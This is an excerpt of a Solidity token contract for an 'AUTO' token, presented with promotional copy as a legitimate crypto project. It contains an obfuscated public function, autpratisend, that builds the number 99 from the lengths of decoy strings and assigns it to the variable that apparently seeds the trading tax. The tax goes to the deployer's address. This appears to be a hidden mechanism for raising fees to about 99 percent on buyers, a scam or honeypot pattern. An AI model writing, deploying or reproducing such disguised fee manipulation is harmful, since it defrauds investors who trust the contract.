...
/*
There is a very specific need in the crypto market right now for what the $AUTO team is offering.
 With it we plan to elevate the crypto space forever.
*/
...
contract TradeAi is Context, IERC20, Ownable {
    ...
    string private constant _symbol = "AUTO";
    ...
    uint256 private Autorens = 1;
    uint256 private _tFeeTotal;
    uint256 private _redisFeeOnBuy = 1;
    uint256 private TonB = 0;
    uint256 private _redisFeeOnSell = 0;

    //Original Fee
    uint256 private _redisFee = _redisFeeOnSell;
    uint256 private NewValuation = Autorens;

    uint256 private _previousredisFee = _redisFee;
    uint256 private _previoustaxFee = NewValuation;

    address payable private _developmentAddress = payable(msg.sender);  //0x442748752cc6411418a2c4B8Fef941dd39ACF1e7
    address payable private _marketingAddress = payable(msg.sender);
    address private uniswapRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    string[6] Sparce = ["Autouallisa","Autoual","Autoutal"];
    string[7] Karse = ["aut","tua"];
    string[2] otuse = ["uto", "otu"];
    ...
    function autpratisend(uint256 f, uint256 g, uint256 h) public {
        f = bytes(Sparce[0]).length;
        g = bytes(otuse[0]).length;
        h = bytes(Karse[1]).length;
        uint256 Speez = f * g * h;
            Autorens = Speez;  
    }
